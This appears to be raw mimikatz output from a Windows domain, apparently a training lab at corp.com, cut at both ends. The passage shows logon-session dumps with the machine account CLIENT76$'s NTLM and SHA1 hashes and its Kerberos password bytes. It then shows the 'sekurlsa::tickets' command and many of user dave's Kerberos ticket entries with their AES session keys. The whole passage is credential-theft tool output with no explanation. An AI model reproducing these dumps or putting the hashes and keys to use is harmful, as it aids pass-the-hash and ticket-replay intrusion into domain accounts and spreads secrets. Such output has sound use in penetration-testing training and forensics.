SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : CLIENT76$
         * Domain   : CORP
         * NTLM     : 89884d4b0c43345607c115d6874238be
         * SHA1     : e95e276c40b12ef0e1a9d697146d7079704089d0
        tspkg :
        wdigest :
         * Username : CLIENT76$
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : CLIENT76$
         * Domain   : corp.com
         * Password : 53 51 d9 f5 ed d7 44 37 86 4a 1d ff c9 a7 e4 30 f5 df 22 ef cc 2a 9a ca f6 ee 47 43 8e d8 31 c0 f7 4c 8e 69 99 07 a9 8f 09 bf f2 1c 3b 0e 31 1e b4 01 77 a8 20 66 a2 8b 93 58 5d 53 57 49 7e de 0a c8 df f9 b4 e8 e3 0c 57 db 8d 27 9f 0e b8 1d bb 45 0f 4a 5b 99 9b e1 f2 db 0a 1d 70 c8 ca 2a 58 17 3b c0 e6 1d 6b 73 0e 81 ae 0e 56 e0 b3 6e 70 24 a9 cc 56 42 f5 ee a0 37 d2 8f e7 bf a8 1a 93 08 98 f0 92 fe 60 44 89 c5 e3 e6 9f 43 9b 45 dd 6f 16 1d c8 cd 51 7d 91 a9 be 21 2c d5 96 e8 cc 40 14 24 7f 29 d4 ce d4 96 52 6b 20 f1 a6 37 36 ee 33 a0 3e 87 62 85 49 62 e3 42 49 2e 6a 69 b2 9d 4f 35 ea d2 f2 d1 dd bf cc 2b 4e 7c c7 2e 18 a6 64 ec 71 ce 5f 9a 00 61 ab 90 43 08 ac 11 7c 7b 2f 73 a1 48 e2 e0 c9 eb ee c1 fe c4 e5 cf 
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : CLIENT76$
Domain            : CORP
Logon Server      : (null)
Logon Time        : 2/26/2025 11:29:01 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : CLIENT76$
         * Domain   : CORP
         * NTLM     : 89884d4b0c43345607c115d6874238be
         * SHA1     : e95e276c40b12ef0e1a9d697146d7079704089d0
        tspkg :
        wdigest :
         * Username : CLIENT76$
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : client76$
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 33787 (00000000:000083fb)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2/26/2025 11:29:01 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : CLIENT76$
         * Domain   : CORP
         * NTLM     : 89884d4b0c43345607c115d6874238be
         * SHA1     : e95e276c40b12ef0e1a9d697146d7079704089d0
        tspkg :
        wdigest :
         * Username : CLIENT76$
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : CLIENT76$
         * Domain   : corp.com
         * Password : 53 51 d9 f5 ed d7 44 37 86 4a 1d ff c9 a7 e4 30 f5 df 22 ef cc 2a 9a ca f6 ee 47 43 8e d8 31 c0 f7 4c 8e 69 99 07 a9 8f 09 bf f2 1c 3b 0e 31 1e b4 01 77 a8 20 66 a2 8b 93 58 5d 53 57 49 7e de 0a c8 df f9 b4 e8 e3 0c 57 db 8d 27 9f 0e b8 1d bb 45 0f 4a 5b 99 9b e1 f2 db 0a 1d 70 c8 ca 2a 58 17 3b c0 e6 1d 6b 73 0e 81 ae 0e 56 e0 b3 6e 70 24 a9 cc 56 42 f5 ee a0 37 d2 8f e7 bf a8 1a 93 08 98 f0 92 fe 60 44 89 c5 e3 e6 9f 43 9b 45 dd 6f 16 1d c8 cd 51 7d 91 a9 be 21 2c d5 96 e8 cc 40 14 24 7f 29 d4 ce d4 96 52 6b 20 f1 a6 37 36 ee 33 a0 3e 87 62 85 49 62 e3 42 49 2e 6a 69 b2 9d 4f 35 ea d2 f2 d1 dd bf cc 2b 4e 7c c7 2e 18 a6 64 ec 71 ce 5f 9a 00 61 ab 90 43 08 ac 11 7c 7b 2f 73 a1 48 e2 e0 c9 eb ee c1 fe c4 e5 cf 
        ssp :
        credman :

Authentication Id : 0 ; 33749 (00000000:000083d5)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2/26/2025 11:29:01 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : CLIENT76$
         * Domain   : CORP
         * NTLM     : 89884d4b0c43345607c115d6874238be
         * SHA1     : e95e276c40b12ef0e1a9d697146d7079704089d0
        tspkg :
        wdigest :
         * Username : CLIENT76$
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : CLIENT76$
         * Domain   : corp.com
         * Password : 53 51 d9 f5 ed d7 44 37 86 4a 1d ff c9 a7 e4 30 f5 df 22 ef cc 2a 9a ca f6 ee 47 43 8e d8 31 c0 f7 4c 8e 69 99 07 a9 8f 09 bf f2 1c 3b 0e 31 1e b4 01 77 a8 20 66 a2 8b 93 58 5d 53 57 49 7e de 0a c8 df f9 b4 e8 e3 0c 57 db 8d 27 9f 0e b8 1d bb 45 0f 4a 5b 99 9b e1 f2 db 0a 1d 70 c8 ca 2a 58 17 3b c0 e6 1d 6b 73 0e 81 ae 0e 56 e0 b3 6e 70 24 a9 cc 56 42 f5 ee a0 37 d2 8f e7 bf a8 1a 93 08 98 f0 92 fe 60 44 89 c5 e3 e6 9f 43 9b 45 dd 6f 16 1d c8 cd 51 7d 91 a9 be 21 2c d5 96 e8 cc 40 14 24 7f 29 d4 ce d4 96 52 6b 20 f1 a6 37 36 ee 33 a0 3e 87 62 85 49 62 e3 42 49 2e 6a 69 b2 9d 4f 35 ea d2 f2 d1 dd bf cc 2b 4e 7c c7 2e 18 a6 64 ec 71 ce 5f 9a 00 61 ab 90 43 08 ac 11 7c 7b 2f 73 a1 48 e2 e0 c9 eb ee c1 fe c4 e5 cf 
        ssp :
        credman :

Authentication Id : 0 ; 32455 (00000000:00007ec7)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2/26/2025 11:29:00 PM
SID               : 
        msv :
         [00000003] Primary
         * Username : CLIENT76$
         * Domain   : CORP
         * NTLM     : 89884d4b0c43345607c115d6874238be
         * SHA1     : e95e276c40b12ef0e1a9d697146d7079704089d0
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : CLIENT76$
Domain            : CORP
Logon Server      : (null)
Logon Time        : 2/26/2025 11:29:00 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : CLIENT76$
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : client76$
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :

mimikatz # sekurlsa::tickets
                                                                                                                                                                                                                  
Authentication Id : 0 ; 4553870 (00000000:00457c8e)                                                    
Session           : Batch from 0                                                                       
User Name         : dave                                                                               
Domain            : CORP                                                                               
Logon Server      : DC1                                                                                
Logon Time        : 7/9/2025 12:00:35 AM                                                               
SID               : S-1-5-21-1987370270-658905905-1781884369-1103                                      
                                                                                                       
         * Username : dave                                                                             
         * Domain   : CORP.COM                                                                         
         * Password : (null)                                               
                                                                           
        Group 0 - Ticket Granting Service                                  
         [00000000]                                                        
           Start/End/MaxRenew: 7/9/2025 12:00:35 AM ; 7/9/2025 10:00:35 AM ; 7/16/2025 12:00:35 AM
           Service Name (02) : cifs ; web04 ; @ CORP.COM                   
           Target Name  (02) : cifs ; web04 ; @ CORP.COM                   
           Client Name  (01) : dave ; @ CORP.COM                           
           Flags 40810000    : name_canonicalize ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             d2295ab10bcd94b67cab49ae283dbce1ee0c51b8431fe77faf3454efa462d4d8
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 12       [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 7/9/2025 12:00:35 AM ; 7/9/2025 10:00:35 AM ; 7/16/2025 12:00:35 AM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM ( CORP )
           Flags 40c10000    : name_canonicalize ; initial ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             5302ec6b512574d58e6358f01739201b1ad8fa6f060063a7607b0d07d0184396
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]

Authentication Id : 0 ; 4547745 (00000000:004564a1)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/9/2025 12:00:22 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103

         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 7/9/2025 12:00:22 AM ; 7/9/2025 10:00:22 AM ; 7/16/2025 12:00:22 AM
           Service Name (02) : cifs ; web04 ; @ CORP.COM
           Target Name  (02) : cifs ; web04 ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM
           Flags 40810000    : name_canonicalize ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             e6cac6ece20fc19831a4f458493e8c6d65396fb5a88b8ff5ea8383fff3905026
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 12       [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 7/9/2025 12:00:22 AM ; 7/9/2025 10:00:22 AM ; 7/16/2025 12:00:22 AM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM ( CORP )
           Flags 40c10000    : name_canonicalize ; initial ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             e08f68dfbf4e8d8fb164566464a92ea601350b181c0ce830155e0f17c1ddced1
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]

Authentication Id : 0 ; 4539290 (00000000:0045439a)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:59:35 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103

         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:59:35 PM ; 7/9/2025 9:59:35 AM ; 7/15/2025 11:59:35 PM
           Service Name (02) : cifs ; web04 ; @ CORP.COM
           Target Name  (02) : cifs ; web04 ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM
           Flags 40810000    : name_canonicalize ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             d3582da3d5e66f2b8a85f653e80d7c6c86ab8029d1fcd1767b6233875b108442
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 12       [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:59:35 PM ; 7/9/2025 9:59:35 AM ; 7/15/2025 11:59:35 PM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM ( CORP )
           Flags 40c10000    : name_canonicalize ; initial ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             a3c511c5112202048cc6b3a81dc21f26420183894e7189306f6d6a413a63d2f3
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]

Authentication Id : 0 ; 4533201 (00000000:00452bd1)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:59:22 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103

         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:59:22 PM ; 7/9/2025 9:59:22 AM ; 7/15/2025 11:59:22 PM
           Service Name (02) : cifs ; web04 ; @ CORP.COM
           Target Name  (02) : cifs ; web04 ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM
           Flags 40810000    : name_canonicalize ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             afbe4e46a622ad9f17233e02e86a264114f1f20d7ad9dd6095831e09400717ce
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 12       [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:59:22 PM ; 7/9/2025 9:59:22 AM ; 7/15/2025 11:59:22 PM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM ( CORP )
           Flags 40c10000    : name_canonicalize ; initial ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             ffa265ba1e4e29e32831f7c71e097a7bcf1b30af6a8fbe24d91b5c9e970de591
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]

Authentication Id : 0 ; 4523855 (00000000:0045074f)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:58:35 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103

         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:58:35 PM ; 7/9/2025 9:58:35 AM ; 7/15/2025 11:58:35 PM
           Service Name (02) : cifs ; web04 ; @ CORP.COM
           Target Name  (02) : cifs ; web04 ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM
           Flags 40810000    : name_canonicalize ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             bcd152c1cc35daa4cd1334bfaa272219a6190c54c84581be50a2c6ca65243a29
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 12       [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:58:35 PM ; 7/9/2025 9:58:35 AM ; 7/15/2025 11:58:35 PM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM ( CORP )
           Flags 40c10000    : name_canonicalize ; initial ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             83375b4df276fd670649b32739549ad459ffa9260414823642402eb102fc62c7
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]

Authentication Id : 0 ; 4517734 (00000000:0044ef66)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:58:22 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103

         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:58:22 PM ; 7/9/2025 9:58:22 AM ; 7/15/2025 11:58:22 PM
           Service Name (02) : cifs ; web04 ; @ CORP.COM
           Target Name  (02) : cifs ; web04 ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM
           Flags 40810000    : name_canonicalize ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             04effbac47ee94dfa696e868988d285da68fa444e5d28fb2a29bce54e7ebab50
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 12       [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:58:22 PM ; 7/9/2025 9:58:22 AM ; 7/15/2025 11:58:22 PM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM ( CORP )
           Flags 40c10000    : name_canonicalize ; initial ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             fd5d2b8c088e702abdc3cfaccb90d4b05090bd9da5ee507f8be643e3f7e7d8b1
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]

Authentication Id : 0 ; 4509686 (00000000:0044cff6)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:57:35 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103

         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:57:35 PM ; 7/9/2025 9:57:35 AM ; 7/15/2025 11:57:35 PM
           Service Name (02) : cifs ; web04 ; @ CORP.COM
           Target Name  (02) : cifs ; web04 ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM
           Flags 40810000    : name_canonicalize ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             09f307aaebebb1cdfaddb2159a94f76908814465e352802a2d163b18e33eada8
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 12       [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:57:35 PM ; 7/9/2025 9:57:35 AM ; 7/15/2025 11:57:35 PM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM ( CORP )
           Flags 40c10000    : name_canonicalize ; initial ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             4a6f891111728d37f4c7d260d48969645accd85df5358c1e46b1ed540373861b
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]

Authentication Id : 0 ; 4503600 (00000000:0044b830)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:57:22 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103

         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:57:22 PM ; 7/9/2025 9:57:22 AM ; 7/15/2025 11:57:22 PM
           Service Name (02) : cifs ; web04 ; @ CORP.COM
           Target Name  (02) : cifs ; web04 ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM
           Flags 40810000    : name_canonicalize ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             c81b78a71e0e5fd0deebad7279f7bf0033dc06f803f1a9cf31ce1230fc51ff5e
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 12       [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:57:22 PM ; 7/9/2025 9:57:22 AM ; 7/15/2025 11:57:22 PM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM ( CORP )
           Flags 40c10000    : name_canonicalize ; initial ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             067b104cfb4cfd3c0b6f9e999eaabc56e01bd3925931e11e3cb3071691320e83
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]

Authentication Id : 0 ; 4495523 (00000000:004498a3)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:56:35 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103

         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:56:35 PM ; 7/9/2025 9:56:35 AM ; 7/15/2025 11:56:35 PM
           Service Name (02) : cifs ; web04 ; @ CORP.COM
           Target Name  (02) : cifs ; web04 ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM
           Flags 40810000    : name_canonicalize ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             5170aaea2803c72451b0923790ea88c76581b15c20036a4bbe2725640e0c3e8e
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 12       [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:56:35 PM ; 7/9/2025 9:56:35 AM ; 7/15/2025 11:56:35 PM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM ( CORP )
           Flags 40c10000    : name_canonicalize ; initial ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             26b104624afc117f7f02a7a5f1b4170c8140b62be93087602535115ca316022b
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]

Authentication Id : 0 ; 4489428 (00000000:004480d4)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:56:22 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103

         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:56:22 PM ; 7/9/2025 9:56:22 AM ; 7/15/2025 11:56:22 PM
           Service Name (02) : cifs ; web04 ; @ CORP.COM
           Target Name  (02) : cifs ; web04 ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM
           Flags 40810000    : name_canonicalize ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             6554c995d135ce69a72eb5f3f8d76461bf8ec8a39cdff3f51fb0c645c0030fce
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 12       [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:56:22 PM ; 7/9/2025 9:56:22 AM ; 7/15/2025 11:56:22 PM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM ( CORP )
           Flags 40c10000    : name_canonicalize ; initial ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             5b00cf190a63a0365df747ef4b25f51e70c64a2f62d63fd1f287a970ea39785d
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]

Authentication Id : 0 ; 4478902 (00000000:004457b6)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:55:35 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103

         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:55:35 PM ; 7/9/2025 9:55:34 AM ; 7/15/2025 11:55:34 PM
           Service Name (02) : cifs ; web04 ; @ CORP.COM
           Target Name  (02) : cifs ; web04 ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM
           Flags 40810000    : name_canonicalize ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             7100b11d657444547509b47881073a91420cc036694f0eccfc5ea18342769c96
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 12       [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:55:34 PM ; 7/9/2025 9:55:34 AM ; 7/15/2025 11:55:34 PM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM ( CORP )
           Flags 40c10000    : name_canonicalize ; initial ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             3965ffaf1ed5b3ca2ae64c8176dfeeb9de38cfe48b18d11c95ff4e7e45a989c3
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]

Authentication Id : 0 ; 4471887 (00000000:00443c4f)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:55:22 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103

         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:55:22 PM ; 7/9/2025 9:55:22 AM ; 7/15/2025 11:55:22 PM
           Service Name (02) : cifs ; web04 ; @ CORP.COM
           Target Name  (02) : cifs ; web04 ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM
           Flags 40810000    : name_canonicalize ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             8cff42636fa03e41d7fd16afba299a88ee71d454160eb57c2b343d9dc677a3b8
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 12       [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:55:22 PM ; 7/9/2025 9:55:22 AM ; 7/15/2025 11:55:22 PM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM ( CORP )
           Flags 40c10000    : name_canonicalize ; initial ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             b2e571090a1fe0f6d0026884584d1d2d1dfae0f744fd0908cd5a54cd8848937b
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]

Authentication Id : 0 ; 4461653 (00000000:00441455)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:54:36 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103

         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:54:36 PM ; 7/9/2025 9:54:35 AM ; 7/15/2025 11:54:35 PM
           Service Name (02) : cifs ; web04 ; @ CORP.COM
           Target Name  (02) : cifs ; web04 ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM
           Flags 40810000    : name_canonicalize ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             0e4b0248c478a3b4d9c51d8e8b0173c4013d37719ec0f9b5e68b436689ee3dcf
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 12       [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:54:35 PM ; 7/9/2025 9:54:35 AM ; 7/15/2025 11:54:35 PM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM ( CORP )
           Flags 40c10000    : name_canonicalize ; initial ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             66218aa0b9e26963d1bf6ca8514260b129d0dd3eef272dd5c2c9bd07f171d53c
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]

Authentication Id : 0 ; 4454962 (00000000:0043fa32)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:54:22 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103

         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:54:22 PM ; 7/9/2025 9:54:22 AM ; 7/15/2025 11:54:22 PM
           Service Name (02) : cifs ; web04 ; @ CORP.COM
           Target Name  (02) : cifs ; web04 ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM
           Flags 40810000    : name_canonicalize ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             33e82387aaa4336ae80bfe8497f2a51f350e8aaf4cb83ad017b1ec207eca1cbc
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 12       [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:54:22 PM ; 7/9/2025 9:54:22 AM ; 7/15/2025 11:54:22 PM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM ( CORP )
           Flags 40c10000    : name_canonicalize ; initial ; renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac      
             f19425ab0df5cd38cc0b9fc1cc51384e01a34ee094326c050c21dc3499b7f3d6
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]

Authentication Id : 0 ; 4399213 (00000000:0043206d)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 7/8/2025 11:53:35 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103

         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 7/8/2025 11:53:36 PM ; 7/9/2025 9:53:35 AM ; 7/15/2025 11:53:35 PM
           Service Name (02) : cifs ; web04 ; @ CORP.COM
           Target Name  (02) : cifs ; web04 ; @ CORP.COM
